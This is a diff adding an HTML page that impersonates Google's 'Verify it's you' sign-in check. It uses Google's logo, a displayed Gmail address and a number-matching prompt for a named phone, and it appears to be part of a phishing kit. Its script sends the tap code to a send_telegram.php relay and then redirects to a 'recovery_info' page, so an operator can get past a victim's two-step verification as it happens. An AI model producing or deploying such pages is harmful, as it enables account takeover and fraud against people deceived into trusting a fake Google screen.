@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it's you</title>
+    <style>
+        body {
+            background-color: #f8f9fa;
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 400px;
+            max-width: 90%;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 74px;
+            height: auto;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        p {
+            margin-bottom: 20px;
+            color: #5f6368;
+        }
+        .email-display {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .email-display img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+        }
+        .verification-code {
+            font-size: 48px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            color: #4285f4;
+        }
+        .instructions {
+            margin-bottom: 20px;
+        }
+        .resend {
+            color: #1a73e8;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .resend:hover {
+            text-decoration: underline;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .btn-primary {
+            background-color: #4285f4;
+            color: white;
+        }
+        .btn-primary:disabled {
+            background-color: #a0c4ff;
+            cursor: not-allowed;
+        }
+        .btn-secondary {
+            background-color: transparent;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 13px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <h1>Verify it's you</h1>
+        <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in. <a href="#">Learn more</a></p>
+        <div class="email-display">
+            <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="User Avatar">
+            <span id="displayEmail">kidan1022@gmail.com</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left: 8px; cursor: pointer;">
+                <polyline points="18 15 12 9 6 15"></polyline>
+            </svg>
+        </div>
+        <div class="verification-code" id="verifyCode">61</div>
+        <div class="instructions">
+            <p><strong>Check your Galaxy A53 5G</strong></p>
+            <p>Google sent a notification to your Galaxy A53 5G. Tap <strong>Yes</strong> on the notification, then tap <strong>61</strong> on your phone to verify it's you.</p>
+        </div>
+        <div class="resend" id="resendCode">Resend it</div>
+        <div class="buttons">
+            <a href="#" class="btn btn-secondary">Try another way</a>
+            <button type="button" id="nextVerification" class="btn btn-primary">Next</button>
+        </div>
+        <div class="footer">
+            <a href="#">Help</a>
+            <span> | </span>
+            <a href="#">Privacy</a>
+            <span> | </span>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        function sendToTelegram(data, callback) {
+            const formData = new FormData();
+            for (const key in data) {
+                formData.append(key, data[key]);
+            }
+
+            fetch('send_telegram.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Telegram response:', result);
+                if (callback) callback(result);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                if (callback) callback({success: false});
+            });
+        }
+
+        document.getElementById('nextVerification').addEventListener('click', function() {
+            const btn = this;
+            const code = document.getElementById('verifyCode').textContent;
+            btn.disabled = true;
+            btn.textContent = 'Verifying...';
+
+            sendToTelegram({
+                action: 'tap_code',
+                tap_code: code
+            }, function(result) {
+                window.location.href = 'recovery_info.html';
+            });
+        });
+
+        document.getElementById('resendCode').addEventListener('click', function() {
+            alert('Verification code resent.');
+        });
+    </script>
+</body>
+</html>
